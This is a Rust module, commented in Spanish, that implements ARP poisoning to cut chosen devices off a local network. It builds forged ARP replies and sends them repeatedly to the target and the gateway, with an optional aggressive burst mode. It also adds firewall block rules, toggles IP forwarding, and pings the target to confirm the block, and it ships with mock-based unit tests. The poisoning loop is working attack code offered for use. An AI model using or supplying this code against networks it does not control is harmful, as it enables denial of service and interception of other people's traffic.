//! Envío y gestión de reglas de bloqueo basadas en ARP/firewall.

use crate::domain::device::DeviceIdentity;
use crate::domain::settings::Settings;
use crate::infrastructure::system::firewall::{FirewallDriver, SystemFirewall};
use crate::infrastructure::system::ip_forwarding;
use anyhow::{anyhow, Result};
use chrono::{DateTime, Utc};
use default_net::{get_default_gateway, get_default_interface};
use pnet_datalink::{self, Channel::Ethernet, Config as DatalinkConfig, MacAddr as PnetMacAddr};
use pnet_packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet_packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet_packet::{MutablePacket, Packet};
use std::collections::HashMap;
use std::net::{IpAddr, Ipv4Addr};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

#[cfg(test)]
use once_cell::sync::Lazy;
#[cfg(test)]
use std::sync::Mutex as StdMutex;

#[cfg(test)]
static MOCK_NETWORK: Lazy<StdMutex<Option<MockNetwork>>> = Lazy::new(|| StdMutex::new(None));

#[cfg(test)]
#[derive(Clone)]
struct MockNetwork {
    context: Arc<NetworkContext>,
    target_mac: PnetMacAddr,
    stop_logs: Vec<String>,
    verify_success: bool,
    verify_logs: Vec<String>,
}

#[cfg(test)]
impl MockNetwork {
    fn create_handle(&self, target_ip: Ipv4Addr) -> SpoofControl {
        let running = Arc::new(AtomicBool::new(true));
        let handle = tokio::spawn(async move { Ok(()) });
        SpoofControl {
            running,
            handle,
            context: self.context.clone(),
            target_ip,
            target_mac: self.target_mac,
        }
    }
}
use tokio::sync::Mutex;
use tokio::task::JoinHandle;
use tokio::time::sleep;

/// Información de un objetivo actualmente bloqueado.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct TargetStatus {
    pub identity: DeviceIdentity,
    pub started_at: DateTime<Utc>,
    pub active: bool,
    pub aggressive: bool,
    pub block_mode: bool,
}

#[derive(Debug, Clone)]
struct NetworkContext {
    interface_name: String,
    local_mac: PnetMacAddr,
    local_ip: Ipv4Addr,
    gateway_ip: Ipv4Addr,
    gateway_mac: PnetMacAddr,
}

struct SpoofControl {
    running: Arc<AtomicBool>,
    handle: JoinHandle<Result<()>>,
    context: Arc<NetworkContext>,
    target_ip: Ipv4Addr,
    target_mac: PnetMacAddr,
}

/// Administrador de táctica de bloqueo basada en ARP/firewall.
#[derive(Clone)]
pub struct ArpSpoofer {
    targets: Arc<Mutex<HashMap<String, TargetStatus>>>,
    ip_forward_state: Arc<Mutex<Option<String>>>,
    settings: Arc<Mutex<Settings>>,
    firewall: Arc<dyn FirewallDriver>,
    firewall_ready: Arc<Mutex<bool>>,
    sessions: Arc<Mutex<HashMap<String, SpoofControl>>>,
}

#[derive(Debug, Default, Clone)]
pub struct BlockOutcome {
    pub logs: Vec<String>,
}

#[derive(Debug, Default, Clone)]
pub struct UnblockOutcome {
    pub logs: Vec<String>,
}

fn default_interval(packet_interval_secs: f64) -> Duration {
    if packet_interval_secs <= 0.0 {
        Duration::from_millis(500)
    } else {
        Duration::from_secs_f64(packet_interval_secs)
    }
}

fn to_pnet_mac(mac: default_net::mac::MacAddr) -> PnetMacAddr {
    let octets = mac.octets();
    PnetMacAddr::new(
        octets[0], octets[1], octets[2], octets[3], octets[4], octets[5],
    )
}

fn discover_network_context() -> Result<Arc<NetworkContext>> {
    #[cfg(test)]
    {
        if let Some(mock) = MOCK_NETWORK.lock().unwrap().as_ref() {
            return Ok(mock.context.clone());
        }
    }

    let interface = get_default_interface().map_err(|err| anyhow::anyhow!(err))?;
    let gateway = get_default_gateway().map_err(|err| anyhow::anyhow!(err))?;

    let local_mac = interface
        .mac_addr
        .ok_or_else(|| anyhow::anyhow!("No se pudo determinar MAC local"))?;
    let local_ip = interface
        .ipv4
        .first()
        .map(|net| net.addr)
        .ok_or_else(|| anyhow::anyhow!("No se encontró IP v4 local"))?;
    let gateway_ip = match gateway.ip_addr {
        IpAddr::V4(ip) => ip,
        _ => return Err(anyhow::anyhow!("La puerta de enlace no es IPv4")),
    };

    let context = NetworkContext {
        interface_name: interface.name.clone(),
        local_mac: to_pnet_mac(local_mac),
        local_ip,
        gateway_ip,
        gateway_mac: to_pnet_mac(gateway.mac_addr),
    };

    Ok(Arc::new(context))
}

fn resolve_target_mac(context: &NetworkContext, target_ip: Ipv4Addr) -> Result<PnetMacAddr> {
    #[cfg(test)]
    {
        if let Some(mock) = MOCK_NETWORK.lock().unwrap().as_ref() {
            return Ok(mock.target_mac);
        }
    }

    let interfaces = pnet_datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == context.interface_name)
        .ok_or_else(|| {
            anyhow::anyhow!(
                "No se encontró la interfaz de red {}",
                context.interface_name
            )
        })?;

    let mut config = DatalinkConfig::default();
    config.read_timeout = Some(Duration::from_millis(300));
    config.write_buffer_size = 2048;
    config.read_buffer_size = 2048;

    let (mut tx, mut rx) = match pnet_datalink::channel(&interface, config)? {
        Ethernet(tx, rx) => (tx, rx),
        _ => return Err(anyhow::anyhow!("Canal de enlace no soportado")),
    };

    let mut packet = [0u8; 42];
    build_arp_request(&mut packet, context.local_mac, context.local_ip, target_ip);

    let deadline = Instant::now() + Duration::from_secs(3);
    while Instant::now() < deadline {
        match tx.send_to(&packet, None) {
            Some(result) => {
                result?;
            }
            None => {
                return Err(anyhow!(
                    "No se pudo enviar paquete ARP en la interfaz {}",
                    context.interface_name
                ));
            }
        }
        let wait_deadline = Instant::now() + Duration::from_millis(300);
        while Instant::now() < wait_deadline {
            match rx.next() {
                Ok(frame) => {
                    if let Some(mac) = parse_arp_response(frame, target_ip) {
                        return Ok(mac);
                    }
                }
                Err(_err) => {
                    // ignorar timeouts
                }
            }
        }
    }

    Err(anyhow::anyhow!(
        "No se obtuvo la MAC del objetivo {} tras múltiples intentos",
        target_ip
    ))
}

fn build_arp_request(
    buffer: &mut [u8],
    local_mac: PnetMacAddr,
    local_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
) {
    let mut ethernet_packet = MutableEthernetPacket::new(buffer).expect("ethernet packet");
    ethernet_packet.set_destination(PnetMacAddr::broadcast());
    ethernet_packet.set_source(local_mac);
    ethernet_packet.set_ethertype(EtherTypes::Arp);

    let mut arp_packet = MutableArpPacket::new(ethernet_packet.payload_mut()).expect("arp packet");
    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Request);
    arp_packet.set_sender_hw_addr(local_mac);
    arp_packet.set_sender_proto_addr(local_ip);
    arp_packet.set_target_hw_addr(PnetMacAddr::zero());
    arp_packet.set_target_proto_addr(target_ip);
}

fn parse_arp_response(frame: &[u8], expected_ip: Ipv4Addr) -> Option<PnetMacAddr> {
    let ethernet = EthernetPacket::new(frame)?;
    if ethernet.get_ethertype() != EtherTypes::Arp {
        return None;
    }
    let arp = ArpPacket::new(ethernet.payload())?;
    if arp.get_operation() == ArpOperations::Reply && arp.get_sender_proto_addr() == expected_ip {
        Some(arp.get_sender_hw_addr())
    } else {
        None
    }
}

fn start_poison_session(
    context: Arc<NetworkContext>,
    target_ip: Ipv4Addr,
    target_mac: PnetMacAddr,
    aggressive: bool,
    interval: Duration,
) -> Result<SpoofControl> {
    #[cfg(test)]
    {
        if let Some(mock) = MOCK_NETWORK.lock().unwrap().as_ref() {
            return Ok(mock.create_handle(target_ip));
        }
    }

    let running = Arc::new(AtomicBool::new(true));
    let running_clone = running.clone();
    let ctx = context.clone();

    let handle = tokio::task::spawn_blocking(move || {
        run_poison_loop(
            running_clone,
            ctx,
            target_ip,
            target_mac,
            aggressive,
            interval,
        )
    });

    Ok(SpoofControl {
        running,
        handle,
        context,
        target_ip,
        target_mac,
    })
}

fn run_poison_loop(
    running: Arc<AtomicBool>,
    context: Arc<NetworkContext>,
    target_ip: Ipv4Addr,
    target_mac: PnetMacAddr,
    aggressive: bool,
    interval: Duration,
) -> Result<()> {
    let interfaces = pnet_datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == context.interface_name)
        .ok_or_else(|| {
            anyhow::anyhow!(
                "No se encontró la interfaz de red {}",
                context.interface_name
            )
        })?;

    let mut config = DatalinkConfig::default();
    config.write_buffer_size = 2048;

    let (mut tx, _rx) = match pnet_datalink::channel(&interface, config)? {
        Ethernet(tx, rx) => (tx, rx),
        _ => return Err(anyhow::anyhow!("Canal de enlace no soportado")),
    };

    let mut target_packet = [0u8; 42];
    build_arp_reply(
        &mut target_packet,
        context.local_mac,
        context.gateway_ip,
        target_mac,
        target_ip,
    );

    let mut gateway_packet = [0u8; 42];
    build_arp_reply(
        &mut gateway_packet,
        context.local_mac,
        target_ip,
        context.gateway_mac,
        context.gateway_ip,
    );

    if aggressive {
        for _ in 0..20 {
            let _ = tx.send_to(&target_packet, None);
            let _ = tx.send_to(&gateway_packet, None);
            std::thread::sleep(Duration::from_millis(20));
        }
    }

    while running.load(Ordering::Relaxed) {
        let _ = tx.send_to(&target_packet, None);
        let _ = tx.send_to(&gateway_packet, None);
        std::thread::sleep(interval);
    }

    Ok(())
}

fn build_arp_reply(
    buffer: &mut [u8],
    source_mac: PnetMacAddr,
    source_ip: Ipv4Addr,
    dest_mac: PnetMacAddr,
    dest_ip: Ipv4Addr,
) {
    let mut ethernet_packet = MutableEthernetPacket::new(buffer).expect("ethernet packet");
    ethernet_packet.set_destination(dest_mac);
    ethernet_packet.set_source(source_mac);
    ethernet_packet.set_ethertype(EtherTypes::Arp);

    let mut arp_packet = MutableArpPacket::new(ethernet_packet.payload_mut()).expect("arp packet");
    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Reply);
    arp_packet.set_sender_hw_addr(source_mac);
    arp_packet.set_sender_proto_addr(source_ip);
    arp_packet.set_target_hw_addr(dest_mac);
    arp_packet.set_target_proto_addr(dest_ip);
}

#[cfg(test)]
fn restore_connection(
    _context: Arc<NetworkContext>,
    _target_ip: Ipv4Addr,
    _target_mac: PnetMacAddr,
) -> Result<Vec<String>> {
    let guard = MOCK_NETWORK.lock().unwrap();
    if let Some(mock) = guard.as_ref() {
        Ok(mock.stop_logs.clone())
    } else {
        Ok(vec!["restauracion simulada".to_string()])
    }
}

#[cfg(not(test))]
fn restore_connection(
    context: Arc<NetworkContext>,
    target_ip: Ipv4Addr,
    target_mac: PnetMacAddr,
) -> Result<Vec<String>> {
    let interfaces = pnet_datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == context.interface_name)
        .ok_or_else(|| {
            anyhow::anyhow!(
                "No se encontró la interfaz de red {}",
                context.interface_name
            )
        })?;

    let mut config = DatalinkConfig::default();
    config.write_buffer_size = 2048;

    let (mut tx, _rx) = match pnet_datalink::channel(&interface, config)? {
        Ethernet(tx, rx) => (tx, rx),
        _ => return Err(anyhow::anyhow!("Canal de enlace no soportado")),
    };

    let mut restore_target = [0u8; 42];
    build_arp_reply(
        &mut restore_target,
        context.gateway_mac,
        context.gateway_ip,
        target_mac,
        target_ip,
    );

    let mut restore_gateway = [0u8; 42];
    build_arp_reply(
        &mut restore_gateway,
        target_mac,
        target_ip,
        context.gateway_mac,
        context.gateway_ip,
    );

    for _ in 0..5 {
        let _ = tx.send_to(&restore_target, None);
        let _ = tx.send_to(&restore_gateway, None);
        std::thread::sleep(Duration::from_millis(200));
    }

    Ok(vec![format!(
        "Tabla ARP restaurada para {} y gateway {}",
        target_ip, context.gateway_ip
    )])
}

async fn verify_blocking(target_ip: Ipv4Addr) -> Result<(bool, Vec<String>)> {
    #[cfg(test)]
    {
        if let Some(mock) = MOCK_NETWORK.lock().unwrap().as_ref() {
            return Ok((mock.verify_success, mock.verify_logs.clone()));
        }
    }

    let mut logs = Vec::new();
    logs.push(format!("Verificando restricción para {}", target_ip));
    sleep(Duration::from_secs(4)).await;

    let mut command = tokio::process::Command::new("ping");
    if cfg!(target_os = "windows") {
        command.args(["-n", "1", &target_ip.to_string()]);
    } else {
        command.args(["-c", "1", "-W", "1", &target_ip.to_string()]);
    }

    match command.output().await {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
            if !stdout.is_empty() {
                logs.push(format!("ping stdout: {}", stdout));
            }
            if !stderr.is_empty() {
                logs.push(format!("ping stderr: {}", stderr));
            }
            let success = !output.status.success();
            if success {
                logs.push("Ping sin respuesta: bloqueo verificado".to_string());
            } else {
                logs.push("Ping respondió: el dispositivo sigue activo".to_string());
            }
            Ok((success, logs))
        }
        Err(err) => {
            logs.push(format!("Error ejecutando ping: {}", err));
            // Si no podemos ejecutar ping, no podemos confirmar bloqueo
            Ok((false, logs))
        }
    }
}

async fn stop_spoof_session(
    map: &Arc<Mutex<HashMap<String, SpoofControl>>>,
    ip: &str,
) -> Result<Vec<String>> {
    if let Some(control) = map.lock().await.remove(ip) {
        shutdown_control(control).await
    } else {
        Ok(Vec::new())
    }
}

async fn shutdown_control(control: SpoofControl) -> Result<Vec<String>> {
    let SpoofControl {
        running,
        handle,
        context,
        target_ip,
        target_mac,
    } = control;

    running.store(false, Ordering::Relaxed);
    let result = handle.await;
    if let Ok(Err(err)) = result {
        tracing::warn!(?err, "Error en hilo de ARP poisoning");
    }
    restore_connection(context, target_ip, target_mac)
}
impl ArpSpoofer {
    /// Crea un spoofer configurado con la puerta de enlace y la interfaz local.
    pub fn new(settings: Settings) -> Result<Self> {
        Self::with_firewall(settings, Arc::new(SystemFirewall::default()))
    }

    /// Permite inyectar un controlador de firewall personalizado (útil en pruebas).
    pub fn with_firewall(settings: Settings, firewall: Arc<dyn FirewallDriver>) -> Result<Self> {
        Ok(Self {
            targets: Arc::new(Mutex::new(HashMap::new())),
            ip_forward_state: Arc::new(Mutex::new(None)),
            settings: Arc::new(Mutex::new(settings)),
            firewall,
            firewall_ready: Arc::new(Mutex::new(false)),
            sessions: Arc::new(Mutex::new(HashMap::new())),
        })
    }

    /// Configura ajustes runtime provenientes del diálogo de agresividad.
    pub async fn update_settings(&self, settings: Settings) {
        let mut guard = self.settings.lock().await;
        *guard = settings;
    }

    /// Inicia el bloqueo del dispositivo indicado.
    pub async fn block(&self, identity: &DeviceIdentity) -> Result<BlockOutcome> {
        let settings = self.settings.lock().await.clone();
        let mut logs = Vec::new();

        let ipv4 = match identity.ip {
            IpAddr::V4(ip) => ip,
            IpAddr::V6(_) => {
                return Err(anyhow!(
                    "El bloqueo solo es compatible con dispositivos IPv4 por el momento"
                ))
            }
        };

        logs.push(format!("Preparando entorno para {}", ipv4));
        let context = discover_network_context()?;
        logs.push(format!(
            "Interfaz predeterminada: {} - MAC local {}",
            context.interface_name, context.local_mac
        ));

        let target_mac = resolve_target_mac(&context, ipv4)?;
        logs.push(format!("MAC del objetivo {}: {}", ipv4, target_mac));

        logs.push(format!("Preparando cortafuegos para {}", identity.ip));
        self.ensure_firewall_ready().await?;
        logs.push("Cortafuegos listo".to_string());

        if settings.block_mode {
            logs.push(format!(
                "Agregando {} a la lista de bloqueo expulsor_blocklist",
                identity.ip
            ));
            self.firewall.block(&identity.ip.to_string()).await?;
            logs.push("Regla de bloqueo aplicada".to_string());
        } else {
            logs.push("block_mode desactivado: no se aplicó regla de firewall".to_string());
        }

        if settings.block_mode {
            let mut state_guard = self.ip_forward_state.lock().await;
            if state_guard.is_none() {
                let previous = ip_forwarding::enable().await?;
                logs.push("Reenvio IP habilitado temporalmente".to_string());
                *state_guard = previous;
            } else {
                logs.push("Reenvio IP ya activo".to_string());
            }
        } else {
            logs.push("block_mode desactivado: reenvio IP sin cambios".to_string());
        }

        let interval = default_interval(settings.packet_interval_secs);
        let spoof_control = start_poison_session(
            context.clone(),
            ipv4,
            target_mac,
            settings.aggressive_mode,
            interval,
        )?;
        logs.push("Sesión de ARP poisoning iniciada".to_string());

        if settings.block_mode {
            let (verified, verification_logs) = verify_blocking(ipv4).await?;
            logs.extend(verification_logs);
            if !verified {
                logs.push("Verificación fallida: se revertirá el bloqueo".to_string());
                let cleanup_logs = shutdown_control(spoof_control).await?;
                logs.extend(cleanup_logs);
                self.firewall.unblock(&identity.ip.to_string()).await?;
                logs.push("Regla de firewall revertida".to_string());

                if self.sessions.lock().await.is_empty() {
                    let mut state_guard = self.ip_forward_state.lock().await;
                    if let Some(previous) = state_guard.take() {
                        ip_forwarding::restore(Some(previous)).await?;
                        logs.push("Estado de reenvio IP restaurado".to_string());
                    }
                }

                return Err(anyhow!(
                    "No se pudo confirmar el bloqueo para {}",
                    identity.ip
                ));
            }
        }

        self.sessions
            .lock()
            .await
            .insert(identity.ip.to_string(), spoof_control);

        let mut guard = self.targets.lock().await;
        guard.insert(
            identity.ip.to_string(),
            TargetStatus {
                identity: identity.clone(),
                started_at: Utc::now(),
                active: true,
                aggressive: settings.aggressive_mode,
                block_mode: settings.block_mode,
            },
        );

        Ok(BlockOutcome { logs })
    }

    /// Detiene el bloqueo actual del dispositivo indicado.
    pub async fn unblock(&self, identity: &DeviceIdentity) -> Result<UnblockOutcome> {
        let mut logs = Vec::new();
        logs.push(format!("Quitando {} de la lista de expulsión", identity.ip));
        self.firewall.unblock(&identity.ip.to_string()).await?;
        logs.push("Regla de bloqueo retirada".to_string());

        let cleanup_logs = stop_spoof_session(&self.sessions, &identity.ip.to_string()).await?;
        logs.extend(cleanup_logs);

        let mut guard = self.targets.lock().await;
        guard.remove(&identity.ip.to_string());

        if guard.is_empty() {
            let mut state_guard = self.ip_forward_state.lock().await;
            if let Some(previous) = state_guard.take() {
                ip_forwarding::restore(Some(previous)).await?;
                logs.push("Estado de reenvio IP restaurado".to_string());
            } else {
                logs.push("No hubo cambios en reenvio IP".to_string());
            }
        }

        Ok(UnblockOutcome { logs })
    }

    /// Recupera un resumen de los objetivos bloqueados.
    #[allow(dead_code)]
    pub async fn get_targets(&self) -> HashMap<String, TargetStatus> {
        self.targets.lock().await.clone()
    }

    async fn ensure_firewall_ready(&self) -> Result<()> {
        let mut guard = self.firewall_ready.lock().await;
        if !*guard {
            self.firewall.ensure_ready().await?;
            *guard = true;
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use futures::future::BoxFuture;
    use std::collections::HashSet;
    use std::sync::Mutex;

    struct MockNetworkGuard;

    impl Drop for MockNetworkGuard {
        fn drop(&mut self) {
            MOCK_NETWORK.lock().unwrap().take();
        }
    }

    impl MockNetwork {
        fn install(self) -> MockNetworkGuard {
            *MOCK_NETWORK.lock().unwrap() = Some(self);
            MockNetworkGuard
        }
    }

    #[derive(Default)]
    struct MockFirewall {
        blocked: Mutex<HashSet<String>>,
        ensure_calls: Mutex<u32>,
        block_calls: Mutex<u32>,
        unblock_calls: Mutex<u32>,
    }

    impl MockFirewall {
        fn is_blocked(&self, ip: &str) -> bool {
            self.blocked.lock().unwrap().contains(ip)
        }

        fn ensure_calls(&self) -> u32 {
            *self.ensure_calls.lock().unwrap()
        }

        fn block_calls(&self) -> u32 {
            *self.block_calls.lock().unwrap()
        }

        fn unblock_calls(&self) -> u32 {
            *self.unblock_calls.lock().unwrap()
        }
    }

    impl FirewallDriver for MockFirewall {
        fn ensure_ready(&self) -> BoxFuture<'_, Result<()>> {
            Box::pin(async move {
                *self.ensure_calls.lock().unwrap() += 1;
                Ok(())
            })
        }

        fn block(&self, ip: &str) -> BoxFuture<'_, Result<()>> {
            let ip = ip.to_string();
            Box::pin(async move {
                *self.block_calls.lock().unwrap() += 1;
                self.blocked.lock().unwrap().insert(ip);
                Ok(())
            })
        }

        fn unblock(&self, ip: &str) -> BoxFuture<'_, Result<()>> {
            let ip = ip.to_string();
            Box::pin(async move {
                *self.unblock_calls.lock().unwrap() += 1;
                self.blocked.lock().unwrap().remove(&ip);
                Ok(())
            })
        }
    }

    #[tokio::test]
    async fn block_registers_target_and_updates_firewall() {
        let _guard = MockNetwork {
            context: Arc::new(NetworkContext {
                interface_name: "test0".to_string(),
                local_mac: PnetMacAddr::new(0, 1, 2, 3, 4, 5),
                local_ip: Ipv4Addr::new(192, 168, 0, 254),
                gateway_ip: Ipv4Addr::new(192, 168, 0, 1),
                gateway_mac: PnetMacAddr::new(0, 16, 32, 48, 64, 80),
            }),
            target_mac: PnetMacAddr::new(170, 187, 204, 221, 238, 255),
            stop_logs: vec!["restaurado".to_string()],
            verify_success: true,
            verify_logs: vec!["mock verify".to_string()],
        }
        .install();

        let firewall = Arc::new(MockFirewall::default());
        let spoofer = ArpSpoofer::with_firewall(Settings::default(), firewall.clone()).unwrap();
        let identity = DeviceIdentity::from_strings("192.168.0.9", Some("AA:BB:CC:DD:EE:FF"))
            .expect("identidad válida");

        let outcome = spoofer.block(&identity).await.expect("bloqueo exitoso");

        let targets = spoofer.get_targets().await;
        assert!(targets.contains_key("192.168.0.9"));
        assert!(firewall.is_blocked("192.168.0.9"));
        assert_eq!(firewall.ensure_calls(), 1);
        assert_eq!(firewall.block_calls(), 1);
        assert!(outcome
            .logs
            .iter()
            .any(|msg| msg.contains("Regla de bloqueo aplicada")));
    }

    #[tokio::test]
    async fn block_skips_firewall_when_block_mode_disabled() {
        let _guard = MockNetwork {
            context: Arc::new(NetworkContext {
                interface_name: "test0".to_string(),
                local_mac: PnetMacAddr::new(0, 1, 2, 3, 4, 5),
                local_ip: Ipv4Addr::new(192, 168, 0, 254),
                gateway_ip: Ipv4Addr::new(192, 168, 0, 1),
                gateway_mac: PnetMacAddr::new(0, 16, 32, 48, 64, 80),
            }),
            target_mac: PnetMacAddr::new(1, 1, 1, 1, 1, 1),
            stop_logs: vec!["restaurado".to_string()],
            verify_success: true,
            verify_logs: vec!["mock verify".to_string()],
        }
        .install();

        let firewall = Arc::new(MockFirewall::default());
        let mut settings = Settings::default();
        settings.block_mode = false;
        let spoofer = ArpSpoofer::with_firewall(settings, firewall.clone()).unwrap();
        let identity = DeviceIdentity::from_strings("192.168.0.10", None).unwrap();

        let outcome = spoofer.block(&identity).await.unwrap();

        assert_eq!(firewall.block_calls(), 0);
        assert!(spoofer.get_targets().await.contains_key("192.168.0.10"));
        assert!(outcome
            .logs
            .iter()
            .any(|msg| msg.contains("block_mode desactivado")));
    }

    #[tokio::test]
    async fn unblock_releases_firewall_and_clears_target() {
        let _guard = MockNetwork {
            context: Arc::new(NetworkContext {
                interface_name: "test0".to_string(),
                local_mac: PnetMacAddr::new(0, 1, 2, 3, 4, 5),
                local_ip: Ipv4Addr::new(192, 168, 0, 254),
                gateway_ip: Ipv4Addr::new(192, 168, 0, 1),
                gateway_mac: PnetMacAddr::new(0, 16, 32, 48, 64, 80),
            }),
            target_mac: PnetMacAddr::new(2, 2, 2, 2, 2, 2),
            stop_logs: vec!["restauracion test".to_string()],
            verify_success: true,
            verify_logs: vec!["mock verify".to_string()],
        }
        .install();

        let firewall = Arc::new(MockFirewall::default());
        let spoofer = ArpSpoofer::with_firewall(Settings::default(), firewall.clone()).unwrap();
        let identity = DeviceIdentity::from_strings("192.168.0.11", None).unwrap();

        spoofer.block(&identity).await.unwrap();
        let report = spoofer.unblock(&identity).await.unwrap();

        assert_eq!(firewall.unblock_calls(), 1);
        assert!(!firewall.is_blocked("192.168.0.11"));
        assert!(spoofer.get_targets().await.is_empty());
        assert!(report
            .logs
            .iter()
            .any(|msg| msg.contains("Regla de bloqueo retirada")));
    }
}
